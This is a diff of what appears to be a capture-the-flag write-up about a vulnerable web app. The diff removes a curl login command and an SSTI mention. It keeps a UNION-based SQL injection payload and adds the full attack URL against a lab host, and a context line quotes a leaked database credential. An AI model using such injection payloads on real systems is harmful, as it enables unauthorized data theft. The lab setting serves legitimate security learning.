@@ -246,23 +246,13 @@ That's admin's **Production DB** credential (`postgres://admin:S3rv3r-Pr0d-P@ss@
 
 The plan: use the same curl session cookie against the search endpoint's raw f-string query, and UNION in a second result set from `system_flags` — a table that isn't scoped to any `owner_id`. The original query returns two columns (`title, secret`), so the UNION needs to match that column count.
 
-First tried logging in via curl to get a reusable session cookie jar:
-
-```bash
-curl -s -c jar --data "username=analyst&password=vaultkeeper" "http://localhost:8080/login"
-```
-
-(Ran this twice by habit before actually needing to — first one alone was already enough, the cookie jar just gets overwritten either way, no harm done.)
-
-Then tested the SSTI smoke test and the SQLi payload together from the SSH session:
-
-![SSTI smoke test + SSTI RCE for FLAG2](images/16-ssti-rce-flag2.png)
-
-But before running it from the terminal, first tried the payload straight through the browser search box to see the mechanics up close:
-
 ```
 q = x' UNION SELECT flag, flag FROM system_flags--
 ```
+```
+http://10.49.133.0:8080/search?q=x' UNION SELECT flag, flag FROM system_flags--
+```
+
 
 ![SQLi payload in browser returning FLAG1](images/15-sqli-flag1.png)
 
